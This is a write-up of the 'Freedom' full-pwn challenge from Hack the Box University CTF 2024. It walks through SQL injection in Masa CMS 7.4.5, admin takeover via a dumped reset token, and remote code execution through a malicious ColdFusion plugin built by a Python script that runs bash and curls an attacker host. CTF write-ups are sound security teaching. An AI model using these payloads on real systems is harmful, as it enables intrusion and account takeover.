# Freedom

Freedom is the second of the three full pwn challenges that we solved with *GCC* during the *Hack the Box University CTF 2024: Binary Badlands*

A full pwn challenge is composed of two flags that we have to find in order to complete it, the first one being the user flag and the second one being the root flag. We are given the ip address of a machine / box and we have to first get a RCE on the machine in order to have the user flag, and then privesc in order to get the root flag. 

## Reconnaissance 

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-13 16:01 CET
Nmap scan report for freedom.htb (10.129.242.128)
Host is up (0.044s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

Since this machine appeared to be a windows host and more specifically a DC and we don’t have any credentials on the AD let’s try to see if we can grab anything using default accounts like Guest or anonymous :
```
eddymalou@parrot:~/Documents/CTF/HTB-UNIV$ nxc smb 10.129.242.128 -u "" -p "" --shares
SMB         10.129.242.128  445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:freedom.htb) (signing:True) (SMBv1:False)
SMB         10.129.242.128  445    DC1              [+] freedom.htb\: 
SMB         10.129.242.128  445    DC1              [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

```
eddymalou@parrot:~/Documents/CTF/HTB-UNIV$ nxc smb 10.129.242.128 -u "guest" -p "" --shares

SMB         10.129.242.128  445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:freedom.htb) (signing:True) (SMBv1:False)
SMB         10.129.242.128  445    DC1              [-] freedom.htb\guest: STATUS_ACCOUNT_DISABLED 
```

Unfortunately this wasn’t very successful, same for enum4linux.

In our initial nmap scan we could see that the port 80 was open so let’s check it out. We realised it was cms running which was called “Masa CMS” and found several endpoints corresponding to an API : `http://freedom.htb/index.cfm/_api/json/v1/default/`

![Masa CMS API](/HTB-UNIVERSITY-2024/FullPwn/images/api_masa.png)

The website was essentially a blog with a search functionality that allowed us to filter the articles being posted there. We tried several payloads in order to get an xss or even a ssti but nothing successful.  

Checking out the robots.txt file we found this : 

```
User-agent: *
Crawl-Delay: 5
Disallow: /admin/
Disallow: /core/
Disallow: /modules/
Disallow: /config/
Disallow: /themes/
Disallow: /plugins/
```

And visiting the /admin endpoint redirected us to the login page of the CMS : `http://freedom.htb/admin/?muraAction=clogin.main`

![Masa CMS Login](/HTB-UNIVERSITY-2024/FullPwn/images/login_masa_cms.png)

No default or weak credentials turned out to work unfortunately so let’s dig deeper. 
Playing around with several requests and looking at the answers on burp we managed to pinpoint the exact version of the CMS : Masa CMS 7.4.5

  ![Masa CMS version](/HTB-UNIVERSITY-2024/FullPwn/images/masa_cms_version.png)
  
After a bit of research we found out that this version of Masa CMS was vulnerable to an SQLi : [https://projectdiscovery.io/blog/hacking-apple-with-sql-injection](https://projectdiscovery.io/blog/hacking-apple-with-sql-injection)

## User flag/Root flag

Let's verify if our instance is indeed vulnerable : 

`http://freedom.htb/index.cfm//_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5C'&previewID=x`

![Masa CMS version](/HTB-UNIVERSITY-2024/FullPwn/images/masa_sql_error.png)

After searching for masa cms sqli we found this CVE with a POC:
  
[https://github.com/Stuub/CVE-2024-32640-SQLI-MuraCMS](https://github.com/Stuub/CVE-2024-32640-SQLI-MuraCMS)
  
After debugging and modifying a bit the script since it did not work for us on the first time we managed to use this payload:  
  
`ghauri -u "http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5C&previewID=x" -p contenthistid --dbs --current-db`

```
available databases [5]:
[] sys
[] performance_schema
[] information_schema
[] dbMasaCMS
[*] mysql
```

We dumped the DB and found an interesting table containing several users and their info -> including bcrypt password hashes but we were unable to crack them.

We then decided to change our approach by resetting the administrator password using the “forgot password button” and dumping the reset token in the db. 

![Reset admin pwd](/HTB-UNIVERSITY-2024/FullPwn/images/rest_admin_pwd.png)

At first we were unsuccessful at this and since the CMS was open source our idea was to reverse engineer the method responsible to generate forgotten password tokens : 

```
<cfset returnURL="#protocol##urlBase##site.getContentRenderer().getURLStem(site.getSiteID(),returnID)#?userID=#arguments.args.userID#"> 

<cfelse>
<cfsetreturnURL="#protocol##urlBase##site.getContentRenderer().getURLStem(site.getSiteID(),returnID)#?userID=#arguments.args.userID#">
```

Using infos found in the dumped db we managed to get close to a valid reset link : 

`http://freedom.htb/index.cfm/75296552-E0A8-4539-B1A46C806D767072/22FC551F-FABE-EA01-C6EDD0885DDC1682/?userID=75296552-E0A8-4539-B1A46C806D767072`

But it was flagged as `invalid or incorrect reset link`. Around the same time, a 
teammate managed to dump the link directly in the db using sqlmap : 

`http://freedom.htb/?display=editProfile&returnID=E7EAB9CD-78D7-4EBB-A3FA718298F0CF15&returnUserID=75296552-E0A8-4539-B1A46C806D767072`

![Token db](/HTB-UNIVERSITY-2024/FullPwn/images/token_db.png)

We can then reset the admin password to "admin" for exemple and login on the CMS.
After looking around the administration page we find an interesting feature : 
 
 ![Upload plugin](/HTB-UNIVERSITY-2024/FullPwn/images/upload_plugin.png)
While searching for plugin examples we stumbled accross this repository : https://github.com/MasaCMS/MasaAuthenticator

After spending quite some time analysing its source code and testing several payloads / uploading them on the CMS, we managed to get a remote code execution by modifying the following file : `config.xml.cfm`

Initially we used this tool [https://github.com/Impenetrable/ReverseFusion/tree/master](https://github.com/Impenetrable/ReverseFusion/tree/master "https://github.com/Impenetrable/ReverseFusion/tree/master")
to generate a reverse shell payload embedded into the .cfm file since we thought the target machine was a windows host (the DC). 

However while testing out our RCE payload, we got an error indicating it couldn't find cmd.exe and showed us clear sign of a linux host (Absolute path like "/var/www/html")

Let's modify the script to get a working RCE : 

```
import sys 
import base64

ip = input("Enter attacking IP address: ")
port = int(input("Enter attacking port number: "))
filename = input("Enter output file name: ")

payload = "curl http://10.10.14.182:4444/toto.txt" 
payload = f"arguments=\"-c {payload}\"" 

with open( filename+".cfm", "w+") as f: 
	f.write("<cfexecute name=\"/bin/bash\"\r") 
	f.write(payload+"\r") f.write("variable=\"data\"\r") 
	f.write("timeout=\"10\" />\r") 
	f.write("<cfdump var=\"#data#\">")

```

We zipped the whole plugin again with our malicious : `config.xml.cfm`

 ![Payload](/HTB-UNIVERSITY-2024/FullPwn/images/malicious_payload.png)
 
And uploaded it onto the CMS : 

![Zip exploit](/HTB-UNIVERSITY-2024/FullPwn/images/exploitzip.png)

Now to trigger our payload we just clicked on "Deploy" and we got our shell : 

![Reverse shell](/HTB-UNIVERSITY-2024/FullPwn/images/reverse_shell.png)

We get a shell on the wsl running on the windows host, but the whole C drive is mounted and we are root! A simple grep and we got both the user and the root flag at the same time! Our solve was completely unintended as the actual solve was mostly AD related (kerberoasting / asrep roasting / kerbrute..).
